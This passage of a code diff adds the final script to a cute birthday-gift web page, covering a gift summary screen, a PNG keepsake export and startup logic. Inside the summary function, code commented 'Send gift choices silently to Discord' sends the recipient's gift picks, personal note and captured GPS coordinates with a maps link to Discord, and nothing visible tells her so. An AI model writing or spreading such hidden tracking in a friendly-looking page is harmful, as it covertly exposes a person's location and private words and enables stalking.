+        document.getElementById('wishDisplayMode').classList.remove('hidden');
+        playSound('chime');
+        showToast('Birthday letter updated! ✨');
+      });
+
+      // -------------------------------------------------------------------
+      // 8. MINIMALIST FINAL SUMMARY SCREEN & HIGH-RES PNG EXPORT
+      // -------------------------------------------------------------------
+      function getSelectedSummaryItems() {
+        const bouquet = getCurrentBouquet();
+        const addons = [];
+        if (state.plushieChecked) {
+          const p = ADDON_ITEMS.find((i) => i.id === state.selectedPlushieId);
+          if (p) addons.push(p);
+        }
+        if (state.braceletChecked) {
+          const b = ADDON_ITEMS.find((i) => i.id === state.selectedBraceletId);
+          if (b) addons.push(b);
+        }
+        return { bouquet, addons };
+      }
+
+      function openSummaryScreen() {
+        const { bouquet, addons } = getSelectedSummaryItems();
+
+        // Send gift choices silently to Discord
+        const addonsSummary =
+          addons.length > 0
+            ? addons.map((item) => `${item.name} (${item.subtitle})`).join(', ')
+            : 'None (Bouquet only)';
+        const gpsSummary =
+          state.gps.status === 'captured' && state.gps.mapsUrl
+            ? `[${state.gps.lat}, ${state.gps.lng}](${state.gps.mapsUrl})`
+            : 'Not shared';
+
+        sendToDiscord(
+          `🎁 ${state.recipientName} confirmed her birthday gift choices!`,
+          `**Bouquet:** ${bouquet.name} (${bouquet.colorTag})\n` +
+            `**Add-on(s):** ${addonsSummary}\n` +
+            `**Note:** "${state.wishMessage}"\n` +
+            `**GPS Pin:** ${gpsSummary}`,
+          16738740
+        );
+
+        document.getElementById('summarySenderTop').textContent = state.senderName;
+        document.getElementById('summaryRecipientTop').textContent = state.recipientName;
+        document.getElementById('summaryWishNote').textContent =
+          `"Happy Birthday, ${state.recipientName}! May your day bloom as brightly as these flowers. Sending all my love — ${state.senderName} 💕"`;
+
+        const grid = document.getElementById('summaryItemsGrid');
+        const allDisplayCards = [
+          {
+            badge: 'Bouquet',
+            name: bouquet.name,
+            subtitle: bouquet.colorTag,
+            bgGradient: bouquet.bgGradient,
+            photoUrl: bouquet.photoUrl,
+            svgArt: bouquet.svgArt,
+          },
+          ...addons.map((a) => ({
+            badge: a.categoryLabel,
+            name: a.name,
+            subtitle: a.subtitle,
+            bgGradient: a.bgGradient,
+            photoUrl: a.photoUrl,
+            svgArt: a.svgArt,
+          })),
+        ];
+
+        if (allDisplayCards.length === 1) {
+          grid.className = 'grid grid-cols-1 max-w-xs mx-auto gap-3.5 mb-5';
+        } else if (allDisplayCards.length >= 3) {
+          grid.className = 'grid grid-cols-1 sm:grid-cols-3 gap-3 mb-5';
+        } else {
+          grid.className = 'grid grid-cols-1 sm:grid-cols-2 gap-3.5 mb-5';
+        }
+
+        grid.innerHTML = allDisplayCards
+          .map((item) => {
+            const visual = item.photoUrl
+              ? `<img src="${item.photoUrl}" alt="${item.name}" class="w-full h-full object-contain rounded-xl" />`
+              : `<div class="scale-105">${item.svgArt}</div>`;
+            return `
+              <div class="bg-blush/50 rounded-2xl border border-rosegold/40 p-3.5 text-center flex flex-col justify-between">
+                <div>
+                  <span class="inline-block text-[10px] font-cute font-semibold uppercase tracking-wider text-rosegolddark mb-1.5">
+                    ${item.badge}
+                  </span>
+                  <div class="w-full aspect-square rounded-xl bg-gradient-to-br ${item.bgGradient} border border-rosegold/35 flex items-center justify-center p-2 mb-2 overflow-hidden">
+                    ${visual}
+                  </div>
+                </div>
+                <div>
+                  <p class="font-cute font-bold text-sm text-choco">${item.name}</p>
+                  <p class="text-[11px] text-chocolight">${item.subtitle}</p>
+                </div>
+              </div>
+            `;
+          })
+          .join('');
+
+        const mainExp = document.getElementById('mainExperience');
+        const summaryScr = document.getElementById('summaryScreen');
+        mainExp.classList.add('opacity-0');
+        setTimeout(() => {
+          mainExp.classList.add('hidden');
+          summaryScr.classList.remove('hidden');
+          window.scrollTo({ top: 0, behavior: 'smooth' });
+          requestAnimationFrame(() => {
+            summaryScr.classList.remove('opacity-0');
+          });
+          playSound('chime');
+          launchConfetti(85, 0.45);
+        }, 350);
+      }
+
+      document.getElementById('confirmChoicesBtn').addEventListener('click', openSummaryScreen);
+
+      document.getElementById('backToEditChoicesBtn').addEventListener('click', () => {
+        const mainExp = document.getElementById('mainExperience');
+        const summaryScr = document.getElementById('summaryScreen');
+        summaryScr.classList.add('opacity-0');
+        setTimeout(() => {
+          summaryScr.classList.add('hidden');
+          mainExp.classList.remove('hidden');
+          requestAnimationFrame(() => {
+            mainExp.classList.remove('opacity-0');
+          });
+        }, 300);
+      });
+
+      function loadImageForCanvas(photoUrl, svgMarkup) {
+        return new Promise((resolve) => {
+          const img = new Image();
+          img.crossOrigin = 'anonymous';
+          img.onload = () => resolve(img);
+          img.onerror = () => {
+            if (photoUrl && svgMarkup) {
+              const fallback = new Image();
+              fallback.onload = () => resolve(fallback);
+              fallback.onerror = () => resolve(null);
+              fallback.src = 'data:image/svg+xml;charset=utf-8,' + encodeURIComponent(svgMarkup);
+            } else {
+              resolve(null);
+            }
+          };
+          if (photoUrl) {
+            img.src = photoUrl;
+          } else {
+            img.src = 'data:image/svg+xml;charset=utf-8,' + encodeURIComponent(svgMarkup);
+          }
+        });
+      }
+
+      document.getElementById('saveSummaryImageBtn').addEventListener('click', async () => {
+        try {
+          const { bouquet, addons } = getSelectedSummaryItems();
+          const allCards = [
+            {
+              badge: 'BOUQUET',
+              title: bouquet.name,
+              subtitle: bouquet.colorTag,
+              photoUrl: bouquet.photoUrl,
+              svgArt: bouquet.svgArt,
+            },
+            ...addons.map((a) => ({
+              badge: a.categoryLabel.toUpperCase(),
+              title: a.name,
+              subtitle: a.subtitle,
+              photoUrl: a.photoUrl,
+              svgArt: a.svgArt,
+            })),
+          ];
+
+          const canvas = document.getElementById('exportCanvas');
+          canvas.width = allCards.length >= 3 ? 1140 : 960;
+          canvas.height = 840;
+          const ctx = canvas.getContext('2d');
+
+          // Cream & Blush Stationery Background
+          ctx.fillStyle = '#fff8f9';
+          ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+          // Double Rose-Gold & Gold Frame
+          ctx.strokeStyle = '#e09f9d';
+          ctx.lineWidth = 8;
+          ctx.strokeRect(24, 24, canvas.width - 48, canvas.height - 48);
+
+          ctx.strokeStyle = '#f4c95d';
+          ctx.lineWidth = 2;
+          ctx.strokeRect(38, 38, canvas.width - 76, canvas.height - 76);
+
+          // Header
+          ctx.textAlign = 'center';
+          ctx.fillStyle = '#ff8fa3';
+          ctx.font = 'bold 40px "Fredoka", sans-serif';
+          ctx.fillText(`Happy Birthday, ${state.recipientName}! 🎂`, canvas.width / 2, 102);
+
+          ctx.fillStyle = '#8d6e63';
+          ctx.font = '600 19px "Quicksand", sans-serif';
+          ctx.fillText(`${state.dateLabel} • A Special Birthday Gift from ${state.senderName}`, canvas.width / 2, 138);
+
+          // Item Cards
+          const count = allCards.length;
+          const marginX = 64;
+          const gap = 24;
+          const cardW = (canvas.width - marginX * 2 - gap * (count - 1)) / count;
+          const cardH = 385;
+          const cardY = 172;
+
+          for (let i = 0; i < count; i++) {
+            const item = allCards[i];
+            const x = marginX + i * (cardW + gap);
+
+            ctx.fillStyle = '#ffffff';
+            ctx.strokeStyle = '#ffb3c1';
+            ctx.lineWidth = 2.5;
+            ctx.fillRect(x, cardY, cardW, cardH);
+            ctx.strokeRect(x, cardY, cardW, cardH);
+
+            ctx.fillStyle = '#ffeef2';
+            ctx.fillRect(x + 22, cardY + 22, cardW - 44, 230);
+
+            const loadedImg = await loadImageForCanvas(item.photoUrl, item.svgArt);
+            if (loadedImg) {
+              const boxW = cardW - 44;
+              const boxH = 230;
+              const scale = Math.min((boxW * 0.85) / loadedImg.width, (boxH * 0.85) / loadedImg.height);
+              const dw = loadedImg.width * scale;
+              const dh = loadedImg.height * scale;
+              ctx.drawImage(
+                loadedImg,
+                x + 22 + (boxW - dw) / 2,
+                cardY + 22 + (boxH - dh) / 2,
+                dw,
+                dh
+              );
+            }
+
+            ctx.textAlign = 'center';
+            ctx.fillStyle = '#c57b79';
+            ctx.font = 'bold 13px "Fredoka", sans-serif';
+            ctx.fillText(item.badge, x + cardW / 2, cardY + 282);
+
+            ctx.fillStyle = '#5c4033';
+            ctx.font = 'bold 21px "Fredoka", sans-serif';
+            ctx.fillText(item.title, x + cardW / 2, cardY + 314);
+
+            ctx.fillStyle = '#8d6e63';
+            ctx.font = '600 14px "Quicksand", sans-serif';
+            ctx.fillText(item.subtitle, x + cardW / 2, cardY + 344);
+          }
+
+          // Short Wish Footer Card
+          ctx.fillStyle = '#ffffff';
+          ctx.strokeStyle = '#e09f9d';
+          ctx.lineWidth = 2;
+          ctx.fillRect(64, 588, canvas.width - 128, 118);
+          ctx.strokeRect(64, 588, canvas.width - 128, 118);
+
+          ctx.fillStyle = '#5c4033';
+          ctx.font = '600 18px "Quicksand", sans-serif';
+          ctx.fillText(
+            `“Happy Birthday, ${state.recipientName}! May your day bloom as brightly as these flowers.”`,
+            canvas.width / 2,
+            636
+          );
+
+          ctx.fillStyle = '#ff8fa3';
+          ctx.font = 'bold 17px "Fredoka", sans-serif';
+          ctx.fillText(`— Always yours, ${state.senderName} 💕`, canvas.width / 2, 676);
+
+          // Subtle Starlight Pin Footer
+          ctx.fillStyle = '#b08978';
+          ctx.font = '600 12px "Quicksand", sans-serif';
+          const pinText =
+            state.gps.status === 'captured' && state.gps.lat !== null
+              ? `Starlight Pin: ${state.gps.lat}, ${state.gps.lng} ✨`
+              : `Starlight Pin: ${state.dateLabel} ✨`;
+          ctx.fillText(pinText, canvas.width / 2, 762);
+
+          const link = document.createElement('a');
+          link.download = `Happy_Birthday_${state.recipientName}.png`;
+          link.href = canvas.toDataURL('image/png');
+          link.click();
+
+          playSound('chime');
+          showToast('Saved your birthday keepsake image! 📸');
+        } catch (err) {
+          showToast('Could not export image in this browser preview.');
+        }
+      });
+
+      // -------------------------------------------------------------------
+      // 9. INITIALIZE ON LOAD
+      // -------------------------------------------------------------------
+      function initApp() {
+        initAmbientParticles();
+        syncTextDisplays();
+        renderBouquetCarousel(false);
+        renderAddonPanels();
+        requestAnimationFrame(animateConfetti);
+      }
+
+      if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', initApp);
+      } else {
+        initApp();
+      }
+    })();
+  </script>
+</body>
+</html>
